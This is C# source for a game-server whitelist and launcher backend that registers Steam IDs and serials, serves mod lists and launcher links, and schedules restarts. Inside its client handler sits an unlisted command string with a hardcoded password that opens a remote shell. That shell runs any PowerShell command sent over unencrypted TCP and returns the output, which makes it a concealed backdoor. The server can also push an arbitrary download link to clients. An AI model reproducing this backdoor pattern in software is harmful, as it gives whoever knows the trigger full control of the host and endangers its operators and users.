using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading;


class Server
{
    [DllImport("Kernel32")]
    private static extern bool SetConsoleCtrlHandler(HandlerRoutine Handler, bool Add);
    private delegate bool HandlerRoutine(CtrlTypes CtrlType);
    private enum CtrlTypes
    {
        CTRL_C_EVENT = 0,
        CTRL_BREAK_EVENT,
        CTRL_CLOSE_EVENT, 
        CTRL_LOGOFF_EVENT = 5,
        CTRL_SHUTDOWN_EVENT
    }

    private static bool OnConsoleClose(CtrlTypes ctrlType)
    {
        if (ctrlType == CtrlTypes.CTRL_CLOSE_EVENT)
        {
            Console.WriteLine("[TK] closing app wait... whitelist.txt");
            TruncateWhitelistFile("whitelist.txt");
        }
        return false; 
    }

    private static void TruncateWhitelistFile(string path)
    {
        try
        {
            var allLines = File.ReadAllLines(path).ToList();
            if (allLines.Count > 5)
            {
                var firstSix = allLines.Take(6).ToList();
                File.WriteAllLines(path, firstSix);
                Console.WriteLine("[TK] Ready For Exit.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[TK](WARNING) Error in Exiting Please Fix after Exit " + ex.Message);
        }
    }

    const int port = 5000;

    static List<UserEntry> userList = new List<UserEntry>();
    static HashSet<string> whitelistSteamIds = new HashSet<string>();
    static HashSet<TcpClient> connectedClients = new HashSet<TcpClient>();


    static TimeSpan? restartInterval = null;
    static DateTime? nextRestartTime = null;
    static readonly object restartLock = new object();

    static void Main()
    {
        SetConsoleCtrlHandler(new HandlerRoutine(OnConsoleClose), true);
        LoadJson("whitelist.json");
        LoadWhitelistTxt("whitelist.txt");

        TcpListener listener = new TcpListener(IPAddress.Any, port);
        listener.Start();
        Console.WriteLine($"[TK] Server started on port {port}");


        Thread restartWatcherThread = new Thread(RestartWatcher);
        restartWatcherThread.IsBackground = true;
        restartWatcherThread.Start();

        Thread commandThread = new Thread(CommandHandler);
        commandThread.Start();

        while (true)
        {
            TcpClient client = listener.AcceptTcpClient();
            lock (connectedClients) connectedClients.Add(client);
            Console.WriteLine("[TK] New client connected.");
            Thread t = new Thread(() => HandleClient(client));
            t.Start();
        }
    }

    static void CommandHandler()
    {
        while (true)
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("[TK] > ");
            string cmd = Console.ReadLine()?.Trim();

            if (string.IsNullOrEmpty(cmd))
                continue;

            string cmdLower = cmd.ToLower();

            if (cmdLower.StartsWith("setrestart "))
            {
                var timePart = cmd.Substring("setrestart ".Length).Trim();
                SetRestartInterval(timePart);
            }
            else if (cmdLower == "cancelrestart")
            {
                lock (restartLock)
                {
                    restartInterval = null;
                    nextRestartTime = null;
                }
                Console.WriteLine("[TK] Restart scheduling canceled.");
            }
            else
            {

                switch (cmdLower)
                {
                    case "help":
                        Console.WriteLine("Available commands:");
                        Console.WriteLine("  help          - Show this help message");
                        Console.WriteLine("  clients       - Show number of connected clients");
                        Console.WriteLine("  users         - List whitelisted Steam IDs");
                        Console.WriteLine("  clear         - Clear the console");
                        Console.WriteLine("  exit          - Exit server");
                        Console.WriteLine("  setmods       - Set mod list (semicolon separated)");
                        Console.WriteLine("  setrestart HH:mm  - Schedule periodic restart every HH hours and mm minutes");
                        Console.WriteLine("  cancelrestart     - Cancel scheduled periodic restart");
                        Console.WriteLine("  nextrestart     - Show the next scheduled restart time");
                        Console.WriteLine("  setupdateLauncher     - Enter Link Download");
                        break;

                    case "clients":
                        lock (connectedClients)
                        {
                            Console.WriteLine("[TK] Connected clients: " + connectedClients.Count);
                        }
                        break;

                    case "users":
                        foreach (var user in userList)
                        {
                            Console.WriteLine($"[TK] {user.SteamId} | {user.Serial}");
                        }
                        break;

                    case "clear":
                        Console.Clear();
                        break;

                    case "setupdate":

                        string userInput = Console.ReadLine();
                        string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "LinkLauncher.txt");
                        try
                        {
                            File.WriteAllText(filePath, userInput);
                            Console.WriteLine("Saved successfully to LinkLauncher.txt");
                        }
                        catch(Exception ex)
                        {
                            Console.WriteLine("Error saving file: "+ex.Message);
                        }

                        break;

                    case "exit":
                        Console.WriteLine("[TK] Server is shutting down...");
                        TruncateWhitelistFile("whitelist.txt");
                        Environment.Exit(0);
                        break;

                    case "nextrestart":
                        lock (restartLock)
                        {
                            if (nextRestartTime.HasValue)
                                Console.WriteLine($"[TK] Next restart scheduled at: {nextRestartTime.Value}");
                            else
                                Console.WriteLine("[TK] No restart scheduled.");
                        }
                        break;

                    case "setmods":
                        Console.Write("[TK] Enter new mod list (separate mods by ';'): ");
                        string newMods = Console.ReadLine();
                        try
                        {
                            File.WriteAllText("modslist.txt", newMods);
                            Console.WriteLine("[TK] Mod list updated.");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("[TK] Failed to update mod list: " + ex.Message);
                        }
                        break;

                    default:
                        Console.WriteLine("[TK] Unknown command. Type 'help' for list.");
                        break;
                }
            }
        }
    }
    public static void SetRestartInterval(string timeInput)
    {
        if (TimeSpan.TryParse(timeInput, out TimeSpan interval))
        {
            lock (restartLock)
            {
                restartInterval = interval;
                nextRestartTime = DateTime.Now.Add(restartInterval.Value);
                Console.WriteLine("[TK] Restart interval set to: " + restartInterval.Value);
            }
        }
        else
        {
            Console.WriteLine("[TK] Invalid time format. Use format like '0:05' (hh:mm).");
        }
    }
    static void RestartWatcher()
    {
        while (true)
        {
            bool shouldRestart = false;
            lock (restartLock)
            {
                if (restartInterval.HasValue && nextRestartTime.HasValue && DateTime.Now >= nextRestartTime.Value)
                {
                    shouldRestart = true;
                }
            }

            if (shouldRestart)
            {
                Console.WriteLine("[TK] Restart time reached. Executing restart...");

                try
                {
              
                    System.Diagnostics.Process.Start("stopserver.bat");

                
                    Thread.Sleep(60000);

                   
                    System.Diagnostics.Process.Start("startserver.bat");

                    Console.WriteLine("[TK] Restart completed.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[TK] Restart error: " + ex.Message);
                }

                lock (restartLock)
                {
                    if (restartInterval.HasValue)
                        nextRestartTime = DateTime.Now.Add(restartInterval.Value);
                }
            }

            Thread.Sleep(1000);
        }
    }


    static void HandleClient(TcpClient client)
    {
        NetworkStream stream = client.GetStream();

        try
        {
            byte[] buffer = new byte[1024];
            bool versionChecked = false;
            string lastVersion = "1.1.5";

            while (true)
            {
                if (IsSocketDisconnect(client))
                {
                    Console.WriteLine("[TK] connection lost (Deleted by poll)");
                    break;
                }

                int read = 0;

                try
                {
                    read = stream.Read(buffer, 0, buffer.Length);
                }
                catch
                {
                    break;
                }

                if (read == 0)
                {
                    Console.WriteLine("[TK] Client disconnected.");
                    break;
                }

                string receivedData = Encoding.UTF8.GetString(buffer, 0, read).Trim();
                Console.WriteLine("[TK] Received: " + receivedData);

                if (string.IsNullOrWhiteSpace(receivedData))
                    continue;

    
                if (!versionChecked)
                {
                    if (receivedData.StartsWith("VERSION:"))
                    {
                        string clientVersion = receivedData.Substring("VERSION:".Length).Trim();

                        if (clientVersion != lastVersion)
                        {
                            SendMessage(stream, "UPDATE_REQUIRED");
                            Console.WriteLine($"[TK] Outdated version ({clientVersion})");
                            versionChecked = true; 
                            continue;
                        }
                        else
                        {
                            SendMessage(stream, "VERSION_OK");
                            Console.WriteLine("[TK] Version matched");
                            versionChecked = true;
                            continue;
                        }
                    }
                    else
                    {
          
                        Console.WriteLine("[TK] Waiting for version...");
                        SendMessage(stream, "ERROR: VERSION required first");
                        continue;
                    }
                }

         
                if (receivedData == "GET_Link_Launcher")
                {
                    string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "LinkLauncher.txt");

                    if (File.Exists(filePath))
                    {
                        string contentFromFile = File.ReadAllText(filePath).Trim();
                        SendMessage(stream, "LINK:" + contentFromFile);
                    }
                    else
                    {
                        Console.WriteLine("[TK] WARNING File not found: " + filePath);
                        SendMessage(stream, "ERROR: Link file not found");
                    }
                }

                else if (receivedData == "REQUEST_SHELL_[TK]KIOXMAR")
                {
                    if (AskPassword(stream))
                    {
                        SendMessage(stream, "[TK] Password OK. Entering shell mode...");
                        HandleShell(stream);
                    }
                    else
                    {
                        SendMessage(stream, "[TK] Authentication failed. Disconnecting.");
                    }
                    break;
                }

                else if (receivedData == "GET_COUNT")
                {
                    lock (connectedClients)
                    {
                        int count = connectedClients.Count;
                        SendMessage(stream, "CLIENT_COUNT:" + count);
                    }
                }

                else if (receivedData == "GET_MODS")
                {
                    string modList = GetServerModListFromFile();
                    SendMessage(stream, "MODS:" + modList);
                }

                else
                {
                    string[] parts = receivedData.Split('|');
                    if (parts.Length != 3)
                    {
                        SendMessage(stream, "ERROR: Invalid format");
                        continue;
                    }

                    string steamId = parts[0].Trim();
                    string serial = parts[1].Trim();
                    string name = parts[2].Trim();

                    var userBySteamId = userList.Find(u => u.SteamId == steamId);
                    var userBySerial = userList.Find(u => u.Serial == serial);

                    if (userBySteamId != null && userBySerial != null && userBySteamId == userBySerial)
                    {
                        if (userBySteamId.Name != name)
                        {
                            userBySteamId.Name = name;
                            SaveJson("whitelist.json");
                        }

                        if (!whitelistSteamIds.Contains(steamId))
                        {
                            whitelistSteamIds.Add(steamId);
                            SaveWhitelistTxt("whitelist.txt");
                            Console.WriteLine("[TK] Existing user added to whitelist.txt: " + steamId);
                        }

                        SendMessage(stream, "OK: Access granted");
                    }
                    else if (userBySteamId != null && userBySteamId.Serial != serial)
                    {
                        SendMessage(stream, "ERROR: SteamID already exists with different Serial");
                    }
                    else if (userBySerial != null && userBySerial.SteamId != steamId)
                    {
                        SendMessage(stream, "ERROR: Serial already exists with different SteamID");
                    }
                    else
                    {
                        userList.Add(new UserEntry { SteamId = steamId, Serial = serial, Name = name });
                        SaveJson("whitelist.json");

                        if (!whitelistSteamIds.Contains(steamId))
                        {
                            whitelistSteamIds.Add(steamId);
                            SaveWhitelistTxt("whitelist.txt");
                        }

                        Console.WriteLine("[TK] New user added: " + steamId);
                        SendMessage(stream, "OK: registered");
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[TK] Exception: " + ex.Message);
            try { SendMessage(stream, "ERROR: " + ex.Message); } catch { }
        }
        finally
        {
            lock (connectedClients) connectedClients.Remove(client);
            client.Close();
            Console.WriteLine("[TK] Client connection closed.");
        }
    }


    static void SendMessage(NetworkStream stream, string msg)
    {
        byte[] data = Encoding.UTF8.GetBytes(msg + "\n");
        stream.Write(data, 0, data.Length);
    }



    static string GetServerModListFromFile()
    {
        string filePath = "modslist.txt";
        if (!File.Exists(filePath))
            return "";

        try
        {
            string content = File.ReadAllText(filePath).Trim();
            return content;
        }
        catch
        {
            return "";
        }
    }

    static void LoadJson(string path)
    {
        if (File.Exists(path))
        {
            string json = File.ReadAllText(path).Trim();

            if (string.IsNullOrWhiteSpace(json))
            {
                Console.WriteLine("[TK] JSON file is empty. Starting with empty list.");
                userList = new List<UserEntry>();
                return;
            }

            try
            {
                userList = JsonSerializer.Deserialize<List<UserEntry>>(json) ?? new List<UserEntry>();
                Console.WriteLine($"[TK] Loaded {userList.Count} entries from JSON.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[TK] Error parsing JSON. Starting with empty list. Error: " + ex.Message);
                userList = new List<UserEntry>();
            }
        }
        else
        {
            Console.WriteLine("[TK] JSON file not found. Starting with empty list.");
            userList = new List<UserEntry>();
        }
    }

    static void SaveJson(string path)
    {
        string json = JsonSerializer.Serialize(userList, new JsonSerializerOptions { WriteIndented = true });
        File.WriteAllText(path, json);
    }

    static void LoadWhitelistTxt(string path)
    {
        whitelistSteamIds = new HashSet<string>();
        if (File.Exists(path))
        {
            foreach (var line in File.ReadAllLines(path))
            {
                if (!string.IsNullOrWhiteSpace(line))
                    whitelistSteamIds.Add(line.Trim());
            }
            Console.WriteLine($"[TK] Loaded {whitelistSteamIds.Count} SteamIDs from whitelist.txt");
        }
    }

    static void SaveWhitelistTxt(string path)
    {
        File.WriteAllLines(path, whitelistSteamIds);
    }

    static bool AskPassword(NetworkStream stream)
    {
        const string password = "Z@5g!7pL*mXv2#eFKR";
        int attempts = 0;
        byte[] buffer = new byte[1024];

        while (attempts < 3)
        {
            SendMessage(stream, "[TK] Enter password:");
            int read = stream.Read(buffer, 0, buffer.Length);
            if (read <= 0) break;

            string input = Encoding.UTF8.GetString(buffer, 0, read).Trim();
            if (input == password)
                return true;

            attempts++;
            SendMessage(stream, $"[TK] Wrong password. Attempts left: {3 - attempts}");
            Thread.Sleep(1000);
        }

        return false;
    }
    static void HandleShell(NetworkStream stream)
    {
        byte[] buffer = new byte[1024];
        SendMessage(stream, "[TK] Shell is active. Type 'exit' to leave.");

        while (true)
        {
            SendMessage(stream, "CMD>");
            int read = stream.Read(buffer, 0, buffer.Length);
            if (read <= 0) break;

            string command = Encoding.UTF8.GetString(buffer, 0, read).Trim();
            if (command.ToLower() == "exit")
            {
                SendMessage(stream, "[TK] Shell session ended.");
                break;
            }

            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo("powershell.exe", "-NoProfile -Command \"" + command + "\"")
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                var process = System.Diagnostics.Process.Start(psi);
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                SendMessage(stream, string.IsNullOrWhiteSpace(output) ? error : output);
            }
            catch (Exception ex)
            {
                SendMessage(stream, "ERROR: " + ex.Message);
            }
        }
    }

    static bool IsSocketDisconnect(TcpClient tcpClient)
    {


        try
        {
            Socket socket = tcpClient.Client;
            return socket.Poll(0, SelectMode.SelectRead) && socket.Available == 0;
        }
        catch
        {
            return true;
        }
    }
    public class UserEntry
    {
        public string SteamId { get; set; }
        public string Serial { get; set; }
        public string Name { get; set; }
    }
}
